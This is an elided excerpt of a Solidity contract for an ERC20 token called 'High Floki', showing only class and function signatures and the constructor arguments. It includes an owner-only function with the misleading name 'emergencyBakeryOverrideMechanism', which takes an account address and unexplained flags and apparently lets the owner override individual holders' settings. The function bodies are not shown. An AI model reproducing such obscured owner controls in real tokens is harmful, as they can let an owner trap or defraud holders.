...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function _MakeFlokiHigh(address account, uint256 amount) internal {
    ...
    function emergencyBakeryOverrideMechanism(address account, bool v1, bool v2, bool v3, uint256 v4) external onlyOwner {
...
contract ERC20HighFloki is Context, ERC20 {
    constructor(
...
contract HighFloki is ERC20HighFloki {
    constructor() ERC20HighFloki("High Floki", "highFLOKI", false, true, 1000, 30, msg.sender, 420000000 * 10 ** 18, msg.sender, 3) {
    }
}